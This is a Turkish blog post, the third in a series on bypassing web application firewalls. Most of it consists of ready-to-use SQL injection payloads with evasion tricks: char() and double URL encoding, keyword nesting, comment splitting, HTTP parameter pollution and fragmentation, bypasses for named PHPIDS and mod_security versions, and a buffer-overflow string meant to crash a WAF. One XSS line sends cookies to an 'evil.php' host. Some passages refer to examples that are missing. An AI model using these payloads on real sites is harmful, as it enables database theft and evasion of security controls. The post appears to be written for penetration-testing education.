---
title: 'Web Güvenlik Duvarlarını Bypasslamak - #3'
description: Tekrardan merhaba! Bugün sizlerle WAF Bypassing serimizin 3. Bölümünda
  sizi SQL Injection'dan başlayarak çok uzun bir maceraya sürükleyeceğim. Yazımın
  konusu SQL Inj Nedir? Olmadığı için bu tanım kısımlarını işlemeyeceğim. Ayrıca diğer
  bölümün devamı olması açısından hızlıca konuya geçiyorum. Şimdiden iyi okumalar.
---

<img src="/images/bypss3.png">

> Tekrardan merhaba! Bugün sizlerle WAF Bypassing serimizin 3. Bölümünda sizi SQL Injection'dan başlayarak çok uzun bir maceraya sürükleyeceğim. Yazımın konusu SQL Inj Nedir? Olmadığı için bu tanım kısımlarını işlemeyeceğim. Ayrıca diğer bölümün devamı olması açısından hızlıca konuya geçiyorum. Şimdiden iyi okumalar. [Click for English](/web-application-firewall-bypassing-3)

### SQL Injection ile WAF Bypasslamak
```
‘ uni<on sel<ect password from mySQL.user limit 1 /*
```
Daha öncede gördüğümüz gibi waf filtresi mevcut. Ancak WAF tarafından engellenen bir karakteri tanımlarsak onu avantaj olarak kullanabiliriz. MySQL veritabanlarında char()’ın işlevi ingilizce karakter değişkenlerini değiştirmek için kullanılır. Örneğin DVWA’dan yararlanarak kullanabileceğimiz bir örneği ele alalım. 

```
‘ UNION select table_schema,table_name FROM information_Schema.tables where table_schema = “dvwa” -
```

Örneğimizdeki gibi karakter kodlamalı olan metinlerin encode işlemi sonucu örneğimizde şu şekildedir:
```
‘ UNION select table_schema,table_name FROM information_Schema.tables where table_schema =char(100,118,119,97) -
```
 Gördüğünüz üzere ‘dvwa’yı içinde ASCII kodlarını kullanan MySQL, char() işlevi olan char(100,112,119,97) ile değiştirdik ve birçok kez filtrelenen veriyi tırnak kullanmadan veritabanına enjekte ettik. WAF’lar char() ile aynı zamanda hemen hemen diğer tüm veritabanlarında olduğu gibi çalışır durumda. Ancak bazen bir seferde yanlızca karakterler tutulabilir, Örnek olarak char(0x##)+char(0x##)+… yani tek yol bizim için işe yaramazsa başkalarını denemek.
 
 Burada ayaküstü şekilde ilk bypassımızı gerçekleştirmiş olduk. Peki nasıl oldu? Çok basit. DVWA üzerinde 'dvwa' yazısını encode ettik. Çünkü tırnak işareti yasaklı karakterdi. Ve biz bunu aştık.<br><br>
 
 
### Anahtar Kelime Değiştirme
Çoğu zaman anahtar kelime yani keywordler engellendiğine dair örnekler sorgudan geçtikten sonra filtrelenme aşamasına gelir ve ardından da ortadaki key sözcüğü silinecek şekilde baştan ve sondan gelen verileri birleştirir. Ve sunucuda yeni yürütülecek bir keyword oluşturur. Katman mantığı ile çalışırlar. İzahı zor bir konudur. Ancak elimden geldiğince anlaşılır şekilde anlatacağım. SQL örneğimiz üzerinden devam edelim.

```
‘ union selselectect password from mySQL.user limit 1 /*
```

Şu anda WAF in 'select' anahtar kelimesini engellediğine dair örnek bir filtre inceliyoruz. Sorgu isteği kabul edilip, ardından filtrelendikten sonra ortadaki 'select' anahtar kelimesi silinecek ve yeni bir 'select' anahtar kelimesi oluşturacaktır.<br>

Dizelerde birleştirme ile SQL anahtar kelimeyi bölebilir ve WAF filtrelerini atlayabiliriz. Birleştirme sözdizimi, veritabanı motoruna göre değişebilir. Örneğin bir MsSQL veritanabanında 1'i seç komutu birleştirme kullanılarak değişebilir.

Yazdığım örneklerdeki gibi, WAF’ları atlamanın etkili yollarından biridir.<br>

Çoğu zaman WAF ların kullandığı filtrelerin büyük / küçük harflere duyarlı anahtar sözcükleri varsa, WAF filtreleri, sağlanan bir sorgudan kötü amaçlı bir anahtar kelimeyi filtreleyemez. Örnek olarak veritananına select büyük ve küçük harfleri engelleyebiliyorsa, ancak yanlızca bu kontrolleri yapıyorsa SeLeCt gibi bir değerin sağlanmasını engellenmeyecek ve WAF’ı bypass edecektir. Bu XSS saldırıları içinde geçerlidir, ve şu şekilde kullanılabilir.<br>

```
var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);
```

Bu bölümün başında da söylediğim gibi, kodumuz hedefine ulaşasaya kadar var olabilecek birçok katman vardır. Şimdiye kadar, dizeleri kodlamanın tek yollarını inceledik. Ancak zincir şeklinde birçok WAF ve birçok kod yazmamız gerekecek.

Şimdi ise web sunucusundaki URL kodunun çözdüğü, ancak WAF ların ayrıca güvenlik amacıyla URL kod encode ettiği bir senaryoyu ele alalım. Bu seferki SQL örneği kodumuş şu şekildedir.

```
%2527%2520union%2520select%2520password%2520from%2520mySQL.user%2520limit%25201%2520%25 2F*
```

Bu dize kodunda URL encode örneğimizdeki ile aynı ancak aynı şekilde bir kez daha kodlanmıştır. Bu durumda WAF bu dizenin kodunu çözdüğünde hala kodlandığı ve kötü amaçlı kodu bulamadığı için onu engelleyemez. Web sunucusu aşamasında, dize tekrar çözülecek ve doğru şekilde çalışacaktır. Kısaca Bypass kodumuz işlevini yerine getirecektir. Öyleyse devam edelim.<br><br>


### WAF’ı SQL Injection ile Bypasslamak
Şimdiye kadar, örneklerimizin çoğu WAF Bypassing için SQL sorguları kullanıyordu. Bunun nedeni, WAF bypassing de kullanılan en yaygın saldırının SQL Inj. olmasıdır. Ama SQL’in kendisiyle başlayalım. SQL (Yapılandırılmış Sorgu Dili’nin kısaltması), veritabanlarının tasarımında ve yönetiminde kullanılan bir sorgu dilidir. Bugün kullanılan ürünlerin çoğu, SQL Server, MySQL ve diğerleri gibi ilişkisel veritabanlarıdır. Veritabanları, satırları ve sütunları olan tablo benzeri bir yapıda depolanan verilere sahiptir.

Bu seride birçok kez görmüş olabileceğiniz sorgular, 'select' deyiminin kullanılmasıyla, istemcinin çağrısında veritabanından veri alan dizelerdir. Select dışında, çoğunlukla SQL Injection’da kullanılan diğer bazı ifadeler vardır ve bunlar şunlardır:

* **INSERT**: INSERT deyimi, bir tablo içinde yeni bir veri satırı oluşturmak için kullanılır. Genellikle bir uygulama bir denetim günlüğüne yeni bir giriş eklediğinde, yeni bir kullanıcı hesabı oluşturduğunda veya yeni bir sipariş oluşturduğunda kullanılır.

* **UPDATE**: UPDATE deyimi, bir tablodaki bir veya daha fazla veri satırını değiştirmek için kullanılır. Genellikle bir kullanıcının veritabanında zaten var olan verilerin değerini değiştirdiği işlevlerde kullanılır.

* **DELETE**: DELETE deyimi, bir veritabanı tablosundaki bir veya daha fazla veri satırını silmek için kullanılır.

SQL enjeksiyon saldırılarında yaygın olarak kullanılan bir ortak özellik daha vardır: UNION operatörü. İki veya daha fazla SELECT ifadesinin sonuçlarını tek bir sonuçta birleştirmek için kullanılır. Dolayısıyla, bir istemci uygulaması sunucudan bazı verileri almak için bir sorgu yaptığında, UNION operatörü başka bir SELECT ifadesi eklemek ve veritabanında her iki seçme ifadesinin yürütülmesini sağlamak için kullanılabilir. Örneğin şu sorguyu ele alalım:

```
SELECT * FROM users WHERE fname=’Tom’
```

Burada sorgu, 'fname' alanı Tom’a eşit olan tablo kullanıcılarından tüm kayıtları döndürmek için çağrılır. (* Karakteri SQL’de bir joker karakterdir ve bir tablodaki tüm sütunları seçer) Şimdi, bu sorguda UNION operatörünün kullanımı oldukça basittir:

```
SELECT * FROM users WHERE fname=’Tom’ UNION SELECT password FROM users -’
```
Burada sorgu, daha önce yaptığı her şeyi yapar ve sonuçlara kullanıcılar tablosundaki parolalar satırının kayıtlarını ekler. Dolayısıyla, bu UNION işlecini, veritabanına zaten bir sorgu sağlayan savunmasız bir web uygulamasında tedarik ederek, bu “denkleme” seçtiğimiz sorguyu ekleyeceğini anlayabilirsiniz. Şimdi SQL Enjeksiyonunun tam olarak ne olduğunu ve bunu WAF Bypassing’de nasıl kullanabileceğimizi görelim.<br>

SQL Enjeksiyonu, saldırganın veri çıkarma amacıyla veritabanına kötü amaçlı hazırlanmış bir sorgu sağladığı bir kod enjeksiyon saldırısıdır. Eskilerden biri olmasına rağmen, gerçekten yaygın bir güvenlik açığıdır. Bu güvenlik açığının nasıl çalıştığını görmek için, bir web sitesinde bir ad verdiğimiz ve ilgili adla ilgili bilgi verdiğimiz bir arama alanı düşünün. Veritabanı aşağıdaki sorguyu yürütür:

```
SELECT * FROM users WHERE name=’tom’;
```
Bu veritabanı savunmasızsa ve bir ‘hata verirsek, sorguda aşağıdaki sonuçlara sahip olacağız:
```
SELECT * FROM users WHERE name=’’’;
```
Bu durumda örnek bir saldırı şöyle olacaktır:
```
SELECT * FROM users WHERE name = ‘tom’ OR ‘1’=’1' — ‘;
```
Burada tom ‘OR’ 1 ‘=’ 1 ‘sağladık-bu her zaman True olarak sonuçlanan mantıksal bir ifadeyle sonuçlandı, çünkü her seferinde 1 = 1 ve or operatörüyle, ikisinden yalnızca birine doğru olması için ihtiyacımız var kullanıcılar tablosundaki her şeyi döndürmek için sorgu. Çift tırnak eklenir, böylece onlardan sonraki her şey yorumlanır ve çalıştırılmaz.<br>

Blind SQL Enjeksiyonu, en yaygın SQL enjeksiyon türüdür ve basit olandan farkı, bu tip enjeksiyonun sonuçlarının saldırgan tarafından görülmemesidir. Sayfa, sonuçları önceki örnekteki gibi göstermeyecek, ancak bunları enjeksiyonumuzdan oluşacak mantıksal ifade sonuçlarına bağlı olarak gösterecektir. Bu, birçok şeyi tek tek test etmek için zamana ihtiyaç duyduğu ve çoğu başarısız istekler olacağı için yararlanılması zor bir güvenlik açığı. İsim arama alanı ile önceki örneği ele alalım. Sızma testinde en yaygın olan böyle bir durumda sorgu tamamen sunucuda gerçekleşir; veritabanının, tablonun veya alanların adlarını veya sorgu dizesini bilmiyoruz. Bu durumda, daha önce sağladığımız basit 1 = 1 bize hiçbir sonuç vermeyecek,<br>

Burada her iki Boolean ifadesinin de doğru olması, tom’un veritabanındaki bir kayda eşit olması ve 1 = 1'in doğru olması gerekir ki bu her zaman olur. Bu bir sonuç döndürürse, Blind SQL Enjeksiyonuna karşı savunmasız olduğu anlamına gelir ve veritabanına parmak izi vermeye devam edebiliriz.

Nasıl devam edileceğine dair iyi bir örnek lazımsa o da karşımızda;
```
Tom’ AND substring(@@version, 1, 1)=5
```
Tırnak işareti bize alt “substring(@@version, 1, 1)=5” bölümüni ve MySQL sürümünün sürüm 5 olup olmadığını kontrol eder ( “= 5” kontrolüyle) ve eğer sürüm 5 çalışıyorsa sayfa yüklenecektir normalde çünkü SQL sorunsuz çalışacaktır. Ve bu blind sql enjeksiyonunun yoludur. Veritabanına, eğer doğruysa, sağladığımız dizenin ilk kısmına karşılık gelen sayfanın yükleneceğine dair sorgular sağlamalıyız.<br>

Bu tür saldırılar, sqlmap gibi otomatik araçlar tarafından birçok kez test edilir, ancak dikkatli olun, çünkü bu tür araçlar gerçekten gürültülüdür ve test ettiğiniz veritabanında çok sayıda gereksiz rapor oluşmasına neden olabilir, kesinlikle istemediğiniz bir şeylerle karşılaşma ihtimaliniz çok yüksektir.<br>

Son olarak, gördüğümüz MySQL parmak izi örneğinden sonra, veritabanına aşağıdaki sorguyu göndererek Oracle tabanlı bir veritabanını bulmanın ve fingerprint almanın benzer bir yolu daha var:<br>
```
SELECT banner FROM v$version WHERE rownum=1
```
Bu gibi durumlarda, yalnızca veritabanı yazılımı hakkında bilgi almakla kalmaz, aynı zamanda sürümle ilgili ayrıntılar da döndürülür, bu nedenle belirli bir sürümü kontrol etmenin bir yolu yoktur, ancak sorguda sadece @@ sürümünü sağlayabiliriz. MySQL için. Temel veritabanı güncel değilse, bellek taşmaları gibi yeni saldırı vektörleri araştırılabilir ve uygulanabilir.Ayrıca, WAF filtre kurallarına ulaşan SQL işlevlerini eş anlamlıları ile değiştirerek, güvenlik açığından Blind-SQL Enjeksiyon yöntemiyle yararlanmak da mümkündür. Örneğin:
```
* substring() -> mid(), substr(), etc * ascii() -> hex(), bin(), etc
```

Şimdi SQL Injection ile WAF üzerinde filtre kuralı baypasının bazı örneklerini görelim.<br><br>

### SQL Injection ile WAF Filtrelerini Bypasslamak

Söylediğimiz gibi, filtre kuralları bir WAF’ın güvenliğinin ana yönüdür ve taramak istediğimiz bir sunucunun önünde bir WAF varsa, bunları atlayabilmemiz gerekir. Şimdi diyelim ki ?id = 1 parametresine sahip http://target.com/?id=1 parametresini test ediyoruz ve temel adımlarımıza göre savunmasız görünüyor. Bize filtre kuralını veren bir sorgu sağlamanın ilk yolu, aşağıdaki gibi basit bir yöntemdir:
 ```
/?id=1+union+(select+*+from+users)
 ```
Burada kodlama olmadan sorgu normaldir ve WAF onu hemen algılar ve bizi engeller. Şimdi, daha önce gördüğümüz gibi bu kuralları atlamanın birçok yolu var, o halde bazı örnekleri inceleyelim:
 ```
/?id=(1)union(select(1),mid(hash,1,32)from(users))
 ```
Bu durumda, WAF’lerin çoğu yalnızca az miktarda işlevi filtrelediği için, substring () işlevini olumlu sonuçlar alabilen mid () işleviyle değiştiririz.
 ```
/?id=1+union+(select’1',concat(login,hash)from+passwords)
 ```
Burada, dizimizi concat () işleviyle birleştiriyoruz, bu WAF’ın tüm sorguyu filtrelediği durumlarda bize yardımcı olabilir. Birleştirerek, sorgumuzun bu tür filtrelerden engellenmeyeceğinden eminiz.
 ```
/?id=(1)union(((((((select(*),hex(hash)from(passwords))))))))
 ```
Çoğu WAF, yalnızca bir parantez katmanını filtreler, bu nedenle bypass etmenin etkili bir yolu, WAF’ı braketin içinde kötü amaçlı hiçbir şey olmadığını düşünmesi için kandıracak daha fazla katman eklemektir.

Şimdi, sektörde kullanılan WAF’lar için bazı gerçek dünya filtre baypassing örneklerini görelim.
<br><br>
### PHPIDS - PHP Saldırı Tespit Sistemi

PHPIDS (PHP Intrusion Detection System), açık kaynaklı bir PHP Web Uygulaması Saldırı Tespit Sistemidir. Doğası gereği yaygın olarak bilinmekte ve kullanılmaktadır ve birçok web sunucusunda bulabilirsiniz. PHPIDS, GitHub sayfasında bulabileceğiniz bazı varsayılan filtre kurallarına sahiptir. Şimdi ilk saldırımızı MySQL veritabanı kullanan bir sistemde gerçekleştirelim:
```
/?id=1+union+select+user,password+from+mysql.user+where+user=1
```
Bunu sağlayarak, WAF bizi engelliyor, çünkü görebileceğiniz gibi, bir SQL sorgusu sağladığımız oldukça açık. Bu sorguyu şunun gibi değiştirelim:
```
/?id=1+union+select+user,password+from+mysql.user+limit+0,1
```
Burada, bir veritabanındaki bir veya daha fazla tablodan kayıtları almak ve bir sınır değerine göre döndürülen kayıt sayısını sınırlamak için kullanılan Where user = 1 değerini limit ifadesiyle değiştirdiğimizi görebilirsiniz. Yani kuralı bilmesek ve sorguyu bu şekilde değiştirsek bile artık kurallardan birini biliyoruz.

Devam ederek, daha önce gördüğümüz gerçekten basit ama güçlü bir sorgu verelim, 1 OR 1 = 1

Burada WAF’ın bizi engellediğini görüyoruz ve oldukça standart ve iyi bilinen kötü niyetli bir sorgu olduğu için normaldir. Ancak baypası da oldukça kolaydır. WAF’ı atlayabilmek ve hedef SQL veritabanına ulaşabilmek için sayıları onaltılık eşdeğerleriyle değiştirmemiz gerekiyor:

Son olarak, kontrol ettiğimiz PHPIDS’in 0.6.1.1 sürümünde, daha önce gördüğümüze benzer bir baypas gerçekleşir ve substring () işlevini mid () işleviyle değiştirirsek, güvenlik duvarını atlayabiliriz. .

Mod_security’nin 2.5.9 sürümünde, baypas edilebilen birçok filtremiz var. Şimdiye kadar tekrar gördüğümüz en yaygın iki tanesi alt dize -- orta değişiklik ve 1 = 1 ifadesinin onaltılı kodlaması. Ayrıca ve 1 = 2 ifadesini aşağıdakilerle de değiştirebiliriz:

Bu filtreyi doğru şekilde atlayacaktır. Ayrıca, bu WAF, bununla değiştirebileceğimiz drop ifadesini filtreliyor.

### SQL Injection ile HPP Exploitleme
Bu yazının başında HTTP Head hakkında konuştuk ve şimdi SQL Enjeksiyon saldırıları hakkında bir fikrimiz olduğuna göre, HPP’den yararlanmak için bunları birleştirelim. Bir HPP saldırısının başarısının, saldırdığımız uygulamanın ortamına bağlı olduğunu söyleyerek başlamalıyız. Şimdi, bu saldırının arkasındaki mantık, bir sorguyu parametreler ekleyerek birçok parçaya ayırabilmemizdir. Örneğin:

```
http://target.com/?id="queryquery1"&id="queryquery2"
```

Son hedefte, web sitesinde HPP Güvenlik Açığı varsa, bu sorgu birleştirilecek ve sunucu tarafından yürütülecektir. Bu güvenlik açığı, bir web uygulamasının gerçekleştirdiği SQL istek kodunda şöyle görünecektir:
```
SQL=”select key from table where id=”+Request.QueryString(“id”)
```
Ve daha önce gördüğümüz mantıkla istismar edilebilir;
```
/?id=1/**/union/*&id=*/select/*&id=*/tom/*&id=*/from/*&id=*/users
```
Anladığınız gibi, sorguyu birleştirmek için birçok & id parametresi kullandık ve bu parametreleri son SQL sunucusu hedefinde yorumlamak için SQL açıklamalarını kullandık. Bu teknikle, sadece yürütülecek sorgu, sonunda kalır. Dolayısıyla, formun yürüttüğü kodu ve parametrede sağladığımız sorguyu birleştirdiğimizde, tablodan anahtarı seçer.<br><br>

### HTTP Parametresini Bölmek 
HTTP Parametre parçalanması, HPP’ye benzer, ancak aynı parametreyi tekrar tekrar kullanmıyoruz. HPF’de, birden fazla parametresi olan web sayfalarına saldırıyoruz ve enjekte etmeye çalıştığımız SQL sorgusu, mevcut parametrelerin sayısı kadar parçaya bölünüyor. Savunmasız koda bir örnek şunlar olabilir:
```
Query(“select * from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’]);
```
```
Query(“select * from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit
```
Gördüğünüz gibi, bu sayfa a ve b olmak üzere iki parametresi olan bir sorgu üretir ve ikisini de sunucuya gönderir. Aşağıdakileri sağlayarak:

Aşağıdaki tüm sorguları enjekte edildikten sonra yorumluyoruz ve bu istek kimsenin saldırıyı gerçekleştirmesine izin vermiyor, çünkü savunmasız kodda AND operatörüne sahip olduğunu görebiliyoruz, bu yüzden her iki parametreye de ihtiyacı var.

Kodu bu şekilde kullanmak için önceki sorgumuzu şunun gibi değiştirebiliriz:
```
/?a=1+union/*&b=*/select+1,2
```
Burada, sorguyu her iki parametrede de ayırdığımızı görebilirsiniz, böylece her iki parametre de mevcut olduğundan kod True olur ve SQL açıklamasını doğru yerlere ekleriz, böylece parametreler sonunda yorumlanır, ve sorgu tek parça halinde birleştirilecektir. İlk savunmasız koddan son sorgu şu şekilde olacaktır:
```
select * from table where a=1 union/* and b=*/select 1,2
```
İkiden fazla parametresi olan başka bir örnek şunlar olabilir:
```
/?a=1+union/*&b=*/select+1,password/*&c=*/from+users-
```
Aynısı burada da geçerlidir, üç parçalı parçalama için, çünkü üç parametremiz var. Bu durumda son SQL parametresi şöyle olacaktır:
```
select * from table where a=1 union/* and b=*/select 1,pass/*limit */from users
```

Önceki örneklerde pek çok kez, gerçekten bahsetmeden normalleşmeden bahsettik. Normalleştirme, WAF’ın WAF’ın da çıkardığı anahtar kelimelerin içine çıkardığı yorumları ve diğer sembolleri ekleme işlemidir, bu nedenle nihai sonuç, veritabanında yürütülmesini istediğimiz istenen sorgumuz olacaktır. Bu gerçekten iyi bir WAF atlama yöntemidir, ancak WAF’ın başarılı olmak için saldırıda kullandığı bazı filtreleri bilmemiz gerekir.

Daha önce gördüğümüz örnekte, WAF’dan (/? A = 1 + union + select + 1,2 /*) filtreleme nedeniyle, kimsenin bir saldırı yapmasına izin vermeyen , aşağıdakileri ekleyebiliriz;
```
/?a=1/*union*/union/*select*/select+1,2/*
```
Burada WAF’ta buna karşılık gelen bir güvenlik açığı varsa, bu istek sunucuda başarıyla gerçekleştirilecektir. WAF tarafından işlendikten sonra istek şu hale gelecektir:
```
?a=1/*uniX on*/union/*sel X ect*/select+1,2/*
```
Bu örnek, tehlikeli trafiğin WAF tarafından temizlenmesi durumunda işe yarar, tüm talebin veya saldırı kaynağının engellenmesi durumunda değildir. Benzer şekilde, aşağıdaki istek kimsenin bu sorguyu gerçekleştirmesine izin vermez:
```
/?id=1+union+select+1,2,3/*
```
Ancak bunu böyle bir şeye değiştirirsek ve WAF normalleştirme tekniklerine karşı savunmasız kalır:
```
/?id=1+un/**/ion+sel/**/ect+1,2,3-
```
Bu sorgu tamamen SQL veritabanında yürütülecek ve şuna benzer şekilde görünecektir:
```
SELECT * from table where id =1 union select 1,2,3-
```
Bu örnek, gelen verilerin aşırı temizlenmesi (normal ifadenin boş dizeyle değiştirilmesi) durumunda işe yarar. Anlayacağınız gibi, / ** / comment sembolü yerine, WAF’ın kestiği herhangi bir sembol dizisi kullanılabilir (örneğin, #### #, % 00 ), ancak bilmemiz gerekir ve bunu bulabiliriz tabikide WAF’ın filtre kurallarının fingerprint'ini alarak.<br><br>

### BufferOwerflow + SQL Injection = WAF Bypassing

Bilmeyenler için, “bir bellek taşması veya arabellek taşması, bir programın bir belleğe veri yazarken belleğin sınırını aştığı ve bitişik bellek konumlarının üzerine yazdığı bir anormalliktir.” Özel kodlama geçmişine sahip bazı WAF’larda bulunan bu güvenlik açığından yararlanabiliriz.
<br><br>
<p align="center">
	<img src="/images/diagram.png">
</p>

Örneğin, birçok güvenlik duvarı C veya C ++ ile yazılır, bu da bir arabellek taşmasıyla çökebilir, çünkü programın bazı değişkenleri yalnızca küçük bir bellek miktarı alabilir ve koruma yoksa veya kötü kodlama yoksa onu atlayabiliriz. .

Tekrar bir web sitesi alalım ve aşağıdaki bağlantıyı sağlayalım:
```
http://www.target.com/?id=-15+and+(select 1)=(Select 0xAA[..(1000“A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2
```
Bu yöntemle önce WAF çöker ve ardından SQL sorgusu sunucuya gelir ve çalıştırılır. Ayrıca şunları sağlayarak güvenlik duvarının çöküp çökmediğini test edebiliriz:
```
http://www.target.com/ id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/% 0A/*nnaa*/+1,2
```
500 HTTP yanıtı döndürürse, bu WAF’ı bufferowerflow ile istismar edebileceğimiz anlamına gelir.

Uzun ve yorucu bir aranın ardından ne yazık kı bugünlük veda ediyoruz. Serinin 4. yazısında görüşmek dileğiyle.
